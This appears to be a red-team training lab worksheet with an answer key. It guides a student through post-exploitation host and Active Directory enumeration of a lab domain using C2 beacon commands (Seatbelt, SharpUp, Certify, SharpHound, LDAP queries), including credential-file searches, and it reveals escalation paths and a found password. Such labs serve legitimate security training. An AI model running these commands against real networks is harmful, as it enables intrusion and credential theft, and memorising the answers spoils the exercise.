# LAB 4 — Host/Domain Enumeration

Use your Reflectra agent to conduct host and domain enumeration.

> **Note:** Make sure the NAT adapter is disabled before starting.

---

## Task 1 — Setup

```bash
mkdir -p ~/AdaptixProjects/<YOUR PROJECT>/loot
```

---

## Task 2 — Host Enumeration

- Execute Seatbelt and download the output:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Seatbelt.exe -group=all -q -outputfile=C:\DevTools\out.txt
beacon> download C:\DevTools\out.txt
```
    - Click the downloads icon to sync to `~/AdaptixProjects/<YOUR PROJECT>/loot/`

- Execute SharpUp audit:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/SharpUp.exe audit
```
- Search for sensitive files with Sauroneye — filetypes `.txt,.docx,.xml,.pdf`, keywords `pass*,secret*,API_KEY`, including system directories:

- Check for unattend files, autologon, and all privesc vectors:

- List Kerberos tickets, browse the desktop, and take a screenshot:

**Questions:**
- How many privilege escalation vectors were you able to find?
- What is the SHA-256 of `C:\Users\seth.hawkins\Desktop\email.html`?
- What is the password provided by the HelpDesk Support Team?
- How many CD-ROM drives does the host have?

---

## Task 3 — Manual Domain Enumeration

```bash
beacon> help ldapsearch
beacon> ldapq computers
beacon> ldapsearch (&(objectCategory=Person)(objectClass=User)) --attributes cn
beacon> certi enum
beacon> ldapsearch <query>
```

[Useful LDAP Queries](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7#domain-and-enterprise-admins)

**Questions:**
- How many domain objects start with `WS`?
- How many objects start with `SRV`?
- What netshare on the DC might be interesting?
- How many locked and disabled accounts are in the domain?
- How many accounts do not have an email address set?
- How many accounts have a Service Principal Name (SPN)?

---

## Task 4 — ADCS Enumeration

Enumerate the Active Directory Certificate Services (ADCS) environment using Certify:

```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Certify.exe enum-cas
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.7_x64/Certify.exe enum-templates
beacon> certi enum
```

**Questions:**
- What is the name of the enterprise CA and which server hosts it?
- What ADCS vulnerability was identified and what does it enable?
- Which enabled certificate templates can be enrolled by Domain Users?
- What is the Legacy ASP Enrollment Website?

---

## Task 5 — Collect BloodHound Data

### Part 1 — Set up BloodHound

```bash
cd /opt/bloodhound/examples/docker-compose
cp docker-compose.yml docker-compose.bak
cp .env.example .env
sed -i 's/BLOODHOUND_HOST=127\.0\.0\.1/BLOODHOUND_HOST=0.0.0.0/' .env
sudo docker compose up --force-recreate
```

- Login at `http://192.168.57.40:8080` with `admin` and the password from the Docker output
- Reset the password: `Profile` → `Reset Password`

### Part 2 — Collect with SharpHound

- Download and extract the SharpHound collector: `Download Collectors` → `Download SharpHound v#.##.# (.zip)`
```bash
unzip ~/Downloads/*.zip
```

- Collect data from the Reflectra agent:
```bash
beacon> execute-assembly /home/kali/Downloads/SharpHound.exe -d cheddarsale.local -c all --zipfilename linuxlogs --zippassword HAILLOME1234
beacon> download <zip name>.zip
```

- Sync the download to `~/AdaptixProjects/<YOUR PROJECT>/loot/` and extract:
```bash
unzip ~/AdaptixProjects/<YOUR PROJECT>/loot/<filename>.zip
```

### Part 3 — Ingest into BloodHound

- Click `Quick Upload`
- Select all `.json` files in the loot directory (Ctrl+click to multi-select)
- Click `Upload`
- Monitor ingestion via `Administration` → `File Ingest`

**Questions:**
- What file is the other artifact created after running SharpHound?
- How would you clean up after running SharpHound?

---

## Task 6 — Analyze BloodHound Data

Mark `seth.hawkins` as owned, then use saved or public queries to identify a path to Domain Admins.

[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

**Questions:**
- Do any non-admin users have DCSync privileges?
- Which system hosts the CA server?
- Can users join a computer to the domain?
- What groups are nested inside Domain Admins?
- What non-service account user is Kerberoastable?
- What user has a session on WS01 other than seth.hawkins?

**Bonus:** How many users have a password in their description field?

---

## Answers

<details>
<summary>Task 2</summary>

- Privilege escalation vectors: Unquoted service path (`workflowengine.exe`), password in `Unattend.xml`, autorun `docengine.exe`, AlwaysInstallElevated, Modifiable Service, Modifiable Service Binary
- SHA-256 of `email.html`: `58573B9AFCBCC4687340A0C828991291C1267E1C21EB9ECC7CEB60FA2B0ED630` `sha256 C:\Users\seth.hawkins\Desktop\email.html`
- HelpDesk password: `ChangeMe1234!@#$` (found in `email.html`)
- CD-ROM drives: 2 (Drive D and E) `disks`

</details>

---

<details>
<summary>Task 3</summary>

- `WS` objects: 20 (WS01–WS20)
- `SRV` objects: 20 (SRV01–SRV20)
- Interesting netshare: `CertEnroll`
- Locked/disabled accounts: 2
- Accounts without email: `Administrator, Guest, vagrant, krbtgt, sccm-client-push, sccm-account-da, sccm-naa, sccm-sql, cifs_svc, sql_svc, http_svc, exchange_svc, RangeAdmin`
- Accounts with SPN: 7

</details>

---

<details>
<summary>Task 4</summary>

- Enterprise CA name: `CHEDDARSALE-CA` hosted on `DC01.cheddarsale.local`
- Vulnerability: ESC8 — the CA supports HTTP web enrollment without channel binding, enabling NTLM relay attacks against the enrollment endpoint
- Enabled templates enrollable by Domain Users: `User` and `EFS`
- Legacy web enrollment URL: `http://DC01.cheddarsale.local/certsrv/`

</details>

---

<details>
<summary>Task 5</summary>

- Other SharpHound artifact: randomly named `.bin` file
- Cleanup: remove the `.bin` file and the zip

</details>

---

<details>
<summary>Task 6</summary>

- DCSync non-admin: No — only Administrators have DCSync permissions
- CA server: DC01 `PKI Hierachy after clicking on CHEDDARSALE-CA`
- Users can join computers: Yes — all users can join up to 10 computers `Cypher: Domains where any user can join a computer to the domain`
- Groups nested in Domain Admins: Windows and Linux groups  `Search Domain Admins and look at "members"`
- Kerberoastable non-service account: Carmen Bolton `Cypher: All Kerberoastable users`  
- Other session on WS01: search `WS01` and expand sessions `Search WS01, expand sessions`

</details>

---

<details>
<summary>Bonus</summary>

Answer: 29

```
MATCH (u:User)
WHERE u.description IS NOT NULL
RETURN u
```

Export to CSV, then:

```bash
cat ~/Downloads/nodes.csv | awk -F "," '{print $1}' | grep Password | wc -l
```

</details>
